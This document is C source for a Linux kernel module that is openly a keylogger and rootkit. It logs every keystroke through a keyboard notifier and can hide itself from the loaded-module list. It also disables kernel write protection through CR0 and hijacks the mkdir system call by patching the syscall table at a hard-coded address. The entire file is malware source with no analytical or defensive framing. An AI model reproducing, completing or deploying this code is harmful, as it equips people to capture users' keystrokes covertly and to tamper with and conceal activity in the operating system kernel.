#include <linux/kernel.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <asm/unistd.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/mutex.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

static DEFINE_MUTEX(module_mutex);
bool HIDE_MODULE = false;
static struct list_head *module_list;

static void hide_module(void)
{
	while (!mutex_trylock(&module_mutex)) {
		cpu_relax();
	}

	module_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);
}

static void show_module(void)
{
	while (!mutex_trylock(&module_mutex)) {
		cpu_relax();
	}

	list_add(&THIS_MODULE->list, module_list);
	mutex_unlock(&module_mutex);
}

static int key_pressed(struct notifier_block *nb, unsigned long action, void *data)
{
	struct keyboard_notifier_param *param = data;

	if (KBD_KEYSYM == action && param->down == 1) {
		char c = param->value;
		printk(KERN_INFO "%c", c);
	}

	return NOTIFY_OK;
}

static struct notifier_block mb_keylogger_nb = {
	.notifier_call = key_pressed
};

static inline void mb_write_cr0(unsigned long val)
{
	__asm__ __volatile__("mov %0, %%cr0": "+r"(val));
}

static void disable_write_protection(void)
{
	unsigned long val = read_cr0();
	val &= (~0x10000);
	mb_write_cr0(val);
}

static void enable_write_protection(void)
{
	unsigned long val = read_cr0();
	val |= 0x10000;
	mb_write_cr0(val);
}

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
typedef asmlinkage long (*custom_mkdir)(const char *path, mode_t mode);

custom_mkdir orig_mkdir;

static asmlinkage long hacked_mkdir(const char *path, mode_t mode)
{
	printk(KERN_INFO ":-)\n");

	return 0;
}

static int __init keylogger_init(void)
{
	register_keyboard_notifier(&mb_keylogger_nb);

	if (HIDE_MODULE == true) {
		hide_module();
	}


	disable_write_protection();
	/*
	 * TODO: make it dynamic, not hard-coded
	 */
	static unsigned long *syscall_table = (unsigned long *)0xffffffff8c800300;
	
	orig_mkdir = (custom_mkdir)syscall_table[__NR_mkdir];
	syscall_table[__NR_mkdir] = (sys_call_ptr_t)hacked_mkdir;

	enable_write_protection();

    return 0;
}

static void __exit keylogger_exit(void)
{
	unregister_keyboard_notifier(&mb_keylogger_nb);

	disable_write_protection();

	/*
	 * TODO: make it dynamic, not hard-coded
	 */
	static unsigned long *syscall_table = (unsigned long *)0xffffffff8c800300;
	syscall_table[__NR_mkdir] = (sys_call_ptr_t)orig_mkdir;    
	enable_write_protection();

}

module_init(keylogger_init);
module_exit(keylogger_exit);

